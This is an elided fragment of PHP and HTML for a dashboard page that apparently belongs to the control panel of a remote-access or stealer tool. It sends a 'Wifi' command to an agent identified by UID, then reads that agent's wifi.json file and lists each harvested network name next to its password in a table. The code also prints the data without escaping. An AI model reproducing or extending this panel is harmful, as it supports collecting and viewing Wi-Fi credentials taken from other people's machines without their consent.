                  ...
                  <div class="col-sm-4">
                     <div class="card">
                        <div class="card-body">
                           ...
                           <div class="list-group">
                              ...
                              <?php echo '<a href="#" class="list-group-item list-group-item-action px-3 border-0 ripple active"> <i class="bi bi-wifi"></i> Wifi</a>'?>
                   ...
                   <div class="col">
                        <div class="col">
                           <div class="card">
                                 <div class="card-body">
                                    <h2> <i class="bi bi-wifi"></i> Wifi</h2>
                                    <hr class="my-2">
                                    <div id="alerts"> </div>
                                    <button type="button" onclick="sendWifi()" class="btn btn-primary"> Send Command  <i class="bi bi-arrow-up-right-circle-fill"></i> </button>        
                                </div>
                            </div>
                        </div>
                        <div class="col">
                           <div class="card">
                              <div class="card-body"> 
                                 <h2> <i class="bi bi-wifi"></i> Wifi Details</h2>
                                 <hr class="my-2">
                                 <table class="table table-bordered table-hover" id="">
                                    ...
                                    <tbody> 
                                       <?php
                                             $uid_wifi_folder = "../../ultiX-Data/".$agent_UID."/wifi.json";
                                             $wifi_data = file_get_contents($uid_wifi_folder);
                                             $data1 = json_decode($wifi_data, true);
                                             $data = $data1["wifi"]["wifi"];
                                             $str_arr = explode(".", $data);

                                             foreach ($str_arr as $wifi) {
                                                $WifiNetwork = substr($wifi, 0, strpos($wifi, ","));
                                                $password = explode(",", $wifi, 2)[1];
                                                echo "<tr>";
                                                echo "<td>" . $WifiNetwork . "</td>";
                                                echo "<td>". $password. "</td>";
                                                echo "</tr>";
                                             }
                                          ?>
